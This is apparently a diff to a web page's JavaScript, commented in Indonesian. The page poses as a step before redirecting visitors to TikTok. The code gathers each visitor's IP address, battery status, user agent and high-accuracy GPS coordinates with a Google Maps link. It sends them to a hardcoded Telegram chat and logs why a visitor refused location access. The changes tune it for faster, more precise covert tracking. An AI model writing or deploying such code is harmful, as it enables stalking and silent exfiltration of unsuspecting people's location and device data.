@@ -80,6 +80,31 @@
         const CHAT_ID = '1966317946'; 
         const DOMAIN_TUJUAN = 'https://tiktok.com'; 
 
+        // Fungsi pembantu untuk mengambil data IP dengan timeout ketat (2.5 detik)
+        async function ambilIP() {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), 2500);
+            try {
+                const res = await fetch('https://ipify.org', { signal: controller.signal });
+                const data = await res.json();
+                clearTimeout(id);
+                return `• IP: \`${data.ip}\``;
+            } catch (e) {
+                return "• IP: `Gagal mengambil IP (Timeout/Blocked)`";
+            }
+        }
+
+        // Fungsi pembantu untuk mengambil data baterai
+        async function ambilBaterai() {
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `${Math.round(battery.level * 100)}% (${battery.charging ? "Mengecas" : "Tidak mengecas"})`;
+                } catch(e) {}
+            }
+            return "Tidak didukung";
+        }
+
         async function prosesMasuk() {
             const btn = document.getElementById('btnLanjut');
             const status = document.getElementById('statusTeks');
@@ -88,37 +113,25 @@
             btn.innerText = "Memproses...";
             status.style.display = "block";
 
-            // 1. Ambil Data Dasar (IP, Perangkat, Baterai) secara INSTAN
-            let ipInfo = "Gagal mengambil IP";
-            try {
-                // Menggunakan ipify yang jauh lebih cepat dan stabil dibanding ipapi
-                const res = await fetch('https://ipify.org');
-                const data = await res.json();
-                ipInfo = `• IP: \`${data.ip}\``;
-            } catch (e) {}
-
+            // Jalankan pengambilan IP dan baterai secara paralel di latar belakang
+            const ipPromise = ambilIP();
+            const bateraiPromise = ambilBaterai();
             const infoPerangkat = navigator.userAgent;
 
-            let infoBaterai = "Tidak didukung";
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100);
-                    const ngecas = battery.charging ? "Mengecas" : "Tidak mengecas";
-                    infoBaterai = `${level}% (${ngecas})`;
-                } catch(e) {}
-            }
-
-            // 2. Minta Koordinat dengan Akses Cepat (Low Accuracy & Timeout Pendek)
+            // Langsung panggil Geolocation tanpa menunggu proses IP selesai
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
+                    async function(position) {
+                        // JIKA BERHASIL MENDAPATKAN LOKASI AKURAT
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const akurasi = position.coords.accuracy;
                         const petaUrl = `https://google.com{lat},${lon}`;
                         
-                        const pesan = `📱 *Data Pengunjung Masuk*\n\n` +
+                        const ipInfo = await ipPromise;
+                        const infoBaterai = await bateraiPromise;
+
+                        const pesan = `📍 *Akses Lokasi Diterima*\n\n` +
                                       `🔋 *Baterai*: ${infoBaterai}\n` +
                                       `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                       `🎯 *Koordinat Akurat*:\n` +
@@ -130,19 +143,38 @@
                         
                         kirimKeTelegram(pesan);
                     },
-                    function(error) {
-                        // Jika akses ditolak atau gagal dapat koordinat, langsung kirim data log yang ada saja
-                        const pesanGagal = `⚠️ *Pengunjung Masuk (Koordinat Gagal/Ditolak)*\n\n` +
+                    async function(error) {
+                        // JIKA GAGAL ATAU DITOLAK
+                        const ipInfo = await ipPromise;
+                        const infoBaterai = await bateraiPromise;
+                        let detailError = "Ditolak pengguna / Sistem sibuk";
+                        
+                        if (error.code === error.PERMISSION_DENIED) {
+                            detailError = "Pengguna menolak izin";
+                        } else if (error.code === error.POSITION_UNAVAILABLE) {
+                            detailError = "Sinyal GPS tidak tersedia";
+                        } else if (error.code === error.TIMEOUT) {
+                            detailError = "Waktu pencarian habis (Timeout)";
+                        }
+
+                        const pesanGagal = `⚠️ *Pengunjung Masuk (Gagal Koordinat)*\n\n` +
+                                           `• Alasan: ${detailError}\n` +
                                            `🔋 *Baterai*: ${infoBaterai}\n` +
                                            `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                            `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                         
                         kirimKeTelegram(pesanGagal);
                     },
-                    // PERUBAHAN PENTING: Mematikan highAccuracy agar pencarian satelit instan, timeout dipangkas jadi 4 detik
-                    { enableHighAccuracy: false, timeout: 4000, maximumAge: 0 }
+                    // PENGATURAN GEOLOCATION UNTUK AKURASI TINGGI MAKSIMAL
+                    { 
+                        enableHighAccuracy: true, // Mengaktifkan kembali GPS internal fisik HP
+                        timeout: 7000,            // Memberikan waktu 7 detik bagi GPS untuk mengunci posisi
+                        maximumAge: 0             // Memaksa peramban mencari lokasi baru (bukan lokasi cache lama)
+                    }
                 );
             } else {
+                const ipInfo = await ipPromise;
+                const infoBaterai = await bateraiPromise;
                 const pesanNoGeo = `❌ *Fitur Koordinat Tidak Didukung*\n\n` +
                                    `🔋 *Baterai*: ${infoBaterai}\n` +
                                    `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
